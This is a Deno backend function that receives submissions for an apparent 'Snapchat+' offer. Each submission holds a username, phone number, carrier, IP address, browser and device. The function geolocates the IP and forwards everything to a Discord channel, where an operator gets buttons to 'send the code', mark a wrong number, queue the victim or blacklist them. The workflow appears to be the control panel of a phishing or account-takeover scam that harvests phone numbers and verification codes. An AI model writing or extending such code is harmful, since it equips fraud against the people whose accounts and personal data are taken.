import { createClientFromRequest } from 'npm:@base44/sdk@0.8.31';

const BOT_TOKEN = Deno.env.get("DISCORD_BOT_TOKEN");
const CHANNEL_ID = "1512395679958302843";

Deno.serve(async (req) => {
  const authHeader = req.headers.get("authorization") || "";
  const token = authHeader.replace("Bearer ", "");
  const expectedToken = Deno.env.get("WEBHOOK_SECRET");
  if (expectedToken && token !== expectedToken) {
    return Response.json({ error: "Unauthorized" }, { status: 401 });
  }

  const base44 = createClientFromRequest(req);
  const body = await req.json();
  const { snapchat, telephone, operateur, submissionId, ip, browser, device } = body;

  const formatPhone = (tel) => tel.replace(/(\d{2})(?=\d)/g, '$1 ').trim();

  const finalIp = ip || "Inconnue";
  const finalBrowser = browser || "Inconnu";
  const finalDevice = device || "Inconnu";

  // Geolocate IP
  let finalCountry = "Inconnue";
  let finalCity = "Inconnue";
  try {
    const geoRes = await base44.functions.invoke("geolocateIP", { ip: finalIp });
    if (geoRes?.data) {
      finalCountry = geoRes.data.country || "Inconnue";
      finalCity = geoRes.data.city || "Inconnue";
    }
  } catch (e) {
    console.error("geolocateIP failed:", e.message);
  }

  const operatorColors = { SFR: 16711680, Bouygues: 3447003, Orange: 16753920 };

  const now = new Date();
  const dateStr = now.toLocaleDateString("fr-FR", {
    weekday: "long", day: "numeric", month: "long", year: "numeric",
    hour: "2-digit", minute: "2-digit", second: "2-digit",
    timeZone: "Europe/Paris"
  });

  const embed = {
    title: "📱 Nouvelle soumission Snapchat+",
    color: operatorColors[operateur] || 16776960,
    fields: [
      { name: "👤 Utilisateur", value: `@${snapchat}`, inline: true },
      { name: "📡 Opérateur", value: operateur, inline: true },
      { name: "📞 Numéro", value: formatPhone(telephone), inline: true },
      { name: "🌍 Pays", value: finalCountry, inline: true },
      { name: "🏙️ Ville", value: finalCity, inline: true },
      { name: "🌐 Navigateur", value: finalBrowser, inline: true },
      { name: "💾 Appareil", value: finalDevice, inline: true },
      { name: "🕵️ Adresse IP", value: `\`${finalIp}\``, inline: false },
      { name: "🕐 Date de soumission", value: dateStr, inline: false },
    ],
    footer: { text: `ID: ${submissionId || "N/A"}` },
    timestamp: now.toISOString(),
  };

  // Buttons for admin actions
  const components = [
    {
      type: 1,
      components: [
        { type: 2, style: 3, label: "✅ Envoyer le code", custom_id: `send_code:${submissionId}` },
        { type: 2, style: 4, label: "❌ Mauvais numéro", custom_id: `wrong:${submissionId}` },
        { type: 2, style: 1, label: "⏳ File d'attente", custom_id: `wait:${submissionId}` },
        { type: 2, style: 4, label: "🚫 Blacklist", custom_id: `blacklist:${submissionId}:${encodeURIComponent(finalIp)}` },
      ]
    }
  ];

  // Post via Bot API
  const msgRes = await fetch(`https://discord.com/api/v10/channels/${CHANNEL_ID}/messages`, {
    method: "POST",
    headers: {
      "Authorization": `Bot ${BOT_TOKEN}`,
      "Content-Type": "application/json"
    },
    body: JSON.stringify({ content: "@everyone", embeds: [embed], components })
  });

  const msgData = await msgRes.json();
  const messageId = msgData.id;

  // Store discord_message_id on submission
  if (messageId) {
    await base44.asServiceRole.entities.Submission.update(submissionId, { discord_message_id: messageId });
  }

  // Log action
  await base44.asServiceRole.entities.ActionLog.create({
    submission_id: submissionId,
    action: "submitted",
    details: { browser: finalBrowser, device: finalDevice, ip: finalIp, country: finalCountry, city: finalCity },
    timestamp: now.toISOString()
  });

  return Response.json({ ok: true, message_id: messageId });
});